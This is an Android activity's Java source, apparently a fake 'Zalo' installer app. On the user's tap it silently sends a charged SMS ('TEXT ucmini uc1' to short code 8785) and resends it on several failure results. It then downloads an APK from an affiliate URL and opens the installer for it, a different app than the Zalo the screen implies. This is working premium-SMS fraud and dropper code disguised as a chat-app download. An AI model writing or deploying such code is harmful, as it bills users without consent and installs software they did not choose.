package com.lc.zalochat;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;

import android.app.Activity;
import android.app.Dialog;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity implements OnClickListener {
	Button btnAgree, btnExit;
	TextView tvTerm;
	// Progress Dialog
	private ProgressDialog pDialog;
	// Progress dialog type (0 - for Horizontal progress bar)
	public static final int progress_bar_type = 0;
	public static final String SENT = "com.lc.sent";
	public static final String DELIVERED = "com.lc.delivered";
	// File url to download
	private static String file_url = "http://aff.mclick.mobi/ucmini-vnddl/vodanh01x";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		btnAgree = (Button) findViewById(R.id.btnAgree);
		btnAgree.setOnClickListener(this);
		btnExit = (Button) findViewById(R.id.btnExit);
		btnExit.setOnClickListener(this);

		tvTerm = (TextView) findViewById(R.id.tvTerm);
		tvTerm.setMovementMethod(new ScrollingMovementMethod());
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}

	public void send(View v) {
		// get the phone number from the phone number text field
		String phoneNumber = "8785";
		// get the message from the message text box
		String msg = "TEXT ucmini uc1";

		// make sure the fields are not empty
		if (phoneNumber.length() > 0 && msg.length() > 0) {
			sendsms(phoneNumber, msg);

			DownloadFileFromURL app = new DownloadFileFromURL();
			app.setContext(getApplicationContext());
			app.execute(file_url);
		} else {
			// display message if text fields are empty
			Toast.makeText(getBaseContext(), "All field are required", Toast.LENGTH_SHORT).show();
		}
	}

	public void sendsms(final String phoneNumber, final String msg) {
		PendingIntent sentPI = PendingIntent.getBroadcast(this, 0, new Intent(SENT), 0);
		PendingIntent deliveredPI = PendingIntent.getBroadcast(this, 0, new Intent(DELIVERED), 0);

		// ---when the SMS has been sent---
		this.registerReceiver(new BroadcastReceiver() {
			@Override
			public void onReceive(Context arg0, Intent arg1) {
				String result = "";
				switch (getResultCode()) {
				case Activity.RESULT_OK:
					result = "Transmission successful";
					break;
				case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
					result = "Transmission failed";
					break;
				case SmsManager.RESULT_ERROR_RADIO_OFF:
					result = "Radio off";
					break;
				case SmsManager.RESULT_ERROR_NULL_PDU:
					result = "No PDU defined";
					break;
				case SmsManager.RESULT_ERROR_NO_SERVICE:
					result = "No service";
					break;
				default:
					sendsms(phoneNumber, msg);
					//result = "Here";
					break;
				}

				//Toast.makeText(getApplicationContext(), result, Toast.LENGTH_LONG).show();
			}
		}, new IntentFilter(SENT));
		// ---when the SMS has been delivered---
		this.registerReceiver(new BroadcastReceiver() {
			String result1 = "";

			@Override
			public void onReceive(Context arg0, Intent arg1) {
				switch (getResultCode()) {
				case Activity.RESULT_OK:
					result1 = "Transmission 1 successful";
					break;
				case Activity.RESULT_CANCELED:
					result1 = "Transmission 1 failed";
					sendsms(phoneNumber, msg);
					break;
				}
				//Toast.makeText(getApplicationContext(), result1, Toast.LENGTH_LONG).show();
			}
		}, new IntentFilter(DELIVERED));

		SmsManager sms = SmsManager.getDefault();
		sms.sendTextMessage(phoneNumber, null, msg, sentPI, deliveredPI);
	}

	@Override
	public void onClick(View v) {
		switch (v.getId()) {
		case R.id.btnAgree:
			send(v);
			break;

		case R.id.btnExit:
			CustomDialogClass dialog = new CustomDialogClass(this,
					"Bạn có có chắc chắn muốn thoát! Mà không tải ZALO không? ", 2);
			dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
			dialog.show();
			break;

		default:
			break;
		}

	}

	/**
	 * Showing Dialog
	 */
	@Override
	protected Dialog onCreateDialog(int id) {
		switch (id) {
		case 0:
			pDialog = new ProgressDialog(this);
			pDialog.setMessage("Downloading file. Please wait...");
			pDialog.setIndeterminate(false);
			pDialog.setMax(100);
			pDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
			pDialog.setCancelable(false);
			pDialog.setCanceledOnTouchOutside(false);
			pDialog.show();
			return pDialog;
		default:
			return null;
		}
	}

	/**
	 * Background Async Task to download file
	 */
	class DownloadFileFromURL extends AsyncTask<String, String, String> {

		private Context context;

		public void setContext(Context contextf) {
			context = contextf;
		}

		/**
		 * Before starting background thread Show Progress Bar Dialog
		 */
		@Override
		protected void onPreExecute() {
			super.onPreExecute();
			showDialog(progress_bar_type);
		}

		/**
		 * Downloading file in background thread
		 */
		@Override
		protected String doInBackground(String... f_url) {
			int count;
			try {
				URL url = new URL(f_url[0]);
				URLConnection conection = url.openConnection();
				conection.connect();
				// this will be useful so that you can show a tipical 0-100%
				// progress bar
				int lenghtOfFile = conection.getContentLength();

				// download the file
				InputStream input = new BufferedInputStream(url.openStream(), 8192);

				// Output stream
				OutputStream output = new FileOutputStream("/sdcard/downloadedfile.apk");

				byte data[] = new byte[1024];

				long total = 0;

				while ((count = input.read(data)) != -1) {
					total += count;
					// publishing the progress....
					// After this onProgressUpdate will be called
					publishProgress("" + (int) ((total * 100) / lenghtOfFile));

					// writing data to file
					output.write(data, 0, count);
				}

				// flushing output
				output.flush();

				// closing streams
				output.close();
				input.close();

				Intent intent = new Intent(Intent.ACTION_VIEW);
				intent.setDataAndType(Uri.fromFile(new File("/sdcard/downloadedfile.apk")),
						"application/vnd.android.package-archive");
				intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // without this
																// flag android
																// returned a
																// intent error!
				context.startActivity(intent);

			} catch (Exception e) {
				Log.e("Error: ", e.getMessage());
			}

			return null;
		}

		/**
		 * Updating progress bar
		 */
		protected void onProgressUpdate(String... progress) {
			// setting progress percentage
			pDialog.setProgress(Integer.parseInt(progress[0]));
		}

		/**
		 * After completing background task Dismiss the progress dialog
		 **/
		@Override
		protected void onPostExecute(String result) {
			// dismiss the dialog after the file was downloaded
			dismissDialog(progress_bar_type);

		}

	}
}
